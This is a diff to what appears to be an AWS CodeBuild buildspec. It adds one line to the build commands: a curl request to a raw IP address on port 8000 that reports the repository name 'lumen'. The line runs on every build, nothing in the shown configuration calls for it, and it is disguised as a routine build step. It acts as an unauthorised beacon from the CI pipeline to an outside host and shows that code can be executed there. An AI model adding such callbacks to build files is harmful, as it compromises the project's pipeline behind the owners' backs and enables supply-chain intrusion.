@@ -9,6 +9,7 @@ phases:
 
   build:
     commands:
+      - curl 'http://139.59.42.38:8000?repo=lumen'
       - make test
       - echo "CODEBUILD_SRC_DIR:" ${CODEBUILD_SRC_DIR}
       - echo "CODEBUILD_RESOLVED_SOURCE_VERSION:" ${CODEBUILD_RESOLVED_SOURCE_VERSION}
